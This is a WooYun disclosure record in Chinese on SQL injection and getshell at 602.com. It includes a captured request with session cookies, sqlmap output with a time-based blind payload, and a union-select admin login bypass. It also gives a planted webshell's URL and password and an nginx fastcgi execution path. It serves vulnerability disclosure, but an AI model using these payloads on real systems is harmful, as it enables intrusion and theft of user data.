{"id": 86989, "wybug_id": "wooyun-2016-0192169", "wybug_title": "602官网SQL注入导致Getshell(近三千万用户信息岌岌可危)", "wybug_corp": "602", "wybug_author": "mango", "wybug_date": "2016-04-06 00:17", "wybug_open_date": "2016-05-22 10:00", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-04-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-04-07：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-04-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-04-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-05-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-05-22：\t细节向公众公开  简要描述： 主站漏洞不是一般的多~ 详细说明：  先说说注入\nPOST /index.php?a=countPlayer&c=index&m=myactivity HTTP/1.1Cookie: pgv_pvi=7749869568; PHPSESSID=n1gnbgmuj3v2nuvfact1t1kt30; token=55f03b06-cc8e-4c76-baa4-532d56c7b08b; account_id=9315245; ci_session=a%3A4%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%22d4e1dfd315e70cc7f51bef6f3a1e8d4b%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A13%3A%22192.168.72.22%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A50%3A%22Mozilla%2F5.0+%28Windows+NT+6.1%3B+WOW64%3B+rv%3A44.0%29+Gecko%22%3Bs%3A13%3A%22last_activity%22%3Bs%3A10%3A%221456483098%22%3B%7Df5019eb6b51de8e681bd8a0a0fa25da0Content-Length: 139Content-Type: application/x-www-form-urlencodedX-Requested-With: XMLHttpRequestReferer: http://www.602.com:80/Host: www.602.comConnection: Keep-aliveDontTrackMeHere: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.0 Safari/537.36Accept: */*a_id=1\nsqlmap identified the following injection points with a total of 2687 HTTP(s) requests:---Parameter: a_id (POST)    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind    Payload: a_id=1 AND SLEEP(5)---back-end DBMS: MySQL 5.0.12sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: a_id (POST)    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind    Payload: a_id=1 AND SLEEP(5)---back-end DBMS: MySQL 5.0.12available databases [1]:[*] phpcmsv9注入还有很多 我就不一一列举了再说说getshell请参考 WooYun: 一个不应该出现的错误导致phpcmsV9.6被秒杀 存在注入1、登陆登陆phpsso_server后台\n用户名：誠' union select 1,0x706870636D73,0x3831346539303966363566316439313263646237636333393833623934333239,4,1,6,7 -- k密码：1\n\n\n\n\n然后利用利用phpsso_server/phpcms/modules/admin/messagequeue.php页面的string2array函数获取shell。http://www.602.com/phpsso_server/asga.php  密码c2\n\n\n\n\n\n\n\n查询用户\n\n两千七百多万将近三千万用户吧~应该没数错、、   漏洞证明：  主站还存在fastcgi nginx代码执行问题http://www.602.com/robots.txt/a.php\n\n   修复方案：  升级哦~~控制好后台访问权限~ 服务器安全一定要做好呀~   版权声明：转载请注明来源 mango@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2016-04-07 09:56 厂商回复： 正在紧急处理 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-04-06 05:04 |    \t\tBloodwolf \t\t\t( 实习白帽子  |\t\t\t        Rank:47 漏洞数:8        | whoami)\t\t \n  各种sql....    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}